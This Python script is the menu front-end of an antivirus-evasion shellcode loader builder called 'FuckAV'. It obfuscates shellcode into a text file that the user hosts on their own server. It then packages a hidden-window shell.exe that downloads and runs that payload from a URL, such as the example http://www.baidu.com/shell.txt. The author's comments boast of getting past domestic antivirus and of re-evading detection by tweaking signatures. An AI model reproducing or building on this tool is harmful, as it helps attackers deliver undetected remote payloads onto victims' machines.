import os
import time
from colorama import init,Fore,Back,Style
init(autoreset=True)
# 脚本采用python3.7编写
# 采用pyinstaller打包，使用之前请安装pyinstaller
# 运行之前先确认一下pip库有没有安装
# 因为开源了嘛，估计要不了半个月就会被加入360豪华套餐了，但是整个程序够简单，被杀了再去改几个特征码照样又可以免杀半个月
# 反正我自己用了半个月，一直都是国内杀软全过
# 保持更新，但是频率比较慢，因为我只是个没用的安服
# 不得不说这个脚本确实有很多地方是在造轮子，但是是有意造的轮子，看似造轮子，实则是为了以后方便魔改（说白了就是菜，因为我是一个没用的安服）

print(f"""
╔============================================================================╗
║                                                                            ║
║    ███████╗    ██╗   ██╗     ██████╗    ██╗  ██╗     █████╗ ██╗   ██╗      ║
║    ██╔════╝    ██║   ██║    ██╔════╝    ██║ ██╔╝    ██╔══██╗██║   ██║      ║
║    █████╗      ██║   ██║    ██║         █████╔╝     ███████║██║   ██║      ║
║    ██╔══╝      ██║   ██║    ██║         ██╔═██╗     ██╔══██║╚██╗ ██╔╝      ║
║    ██║         ╚██████╔╝    ╚██████╗    ██║  ██╗    ██║  ██║ ╚████╔╝       ║
║    ╚═╝          ╚═════╝      ╚═════╝    ╚═╝  ╚═╝    ╚═╝  ╚═╝  ╚═══╝ V1.1   ║
║  Author:1frame                                             Time:2021-8-20  ║
╚============================================================================╝
""")
print('\033[1;31;40m''[*]''\033[1;37;40m'" exp: python FuckAV.py")
print()
print('\033[1;32;40m''[*]''\033[1;37;40m'" 先混淆shellcode生成txt，再编译exe！！！")
print()
print('\033[1;33;40m''[*]''\033[1;37;40m'" 输入shellcode后将生成的txt文件放置在自己的服务器上，同时生成exe程序（shell.exe）")
print()
print('\033[1;34;40m''[*]''\033[1;37;40m'" exe用法: shell.exe \"shellcode加载地址\"")
print()
print('\033[1;35;40m''[*]''\033[1;37;40m'" exmpale: shell.exe http://www.baidu.com/shell.txt")
print()
print('\033[1;36;40m''[*]''\033[1;37;40m'" 更改exe图标: 替换目录下的ico.ico文件即可")
print()
print("====================================================================")
print()
print('\033[1;31;40m''[1]''\033[1;37;40m'": 编码shellcode")
print('\033[1;31;40m''[2]''\033[1;37;40m'": 编译生成exe")
xz=input(f"""
[♥] 选择1/2: """)
if xz=="1":
    import loader
    print()
    time.sleep(2)
    print('\033[1;32;40m''[♥]''\033[1;37;40m''===================shellcode混淆完成======================')
    print('\033[1;34;40m''[*]''\033[1;37;40m'" txt路径:\dist\hex.txt")
    print('\033[1;34;40m''[*]''\033[1;37;40m'" 请将txt上传至您的服务器")
    os.system("pause")
    os.system("python fuckav.py")
else:
    if xz=="2":
        os.system ("pyinstaller -F -w -i ico.ico decode.py -n shell.exe")
        print()
        time.sleep(2)
        print('\033[1;32;40m''[♥]''\033[1;37;40m'"===================exe打包完成====================")
        print('\033[1;34;40m''[*]''\033[1;37;40m'" exe路径:\dist\shell.exe")
        os.system("pause")
        os.system("python fuckav.py")
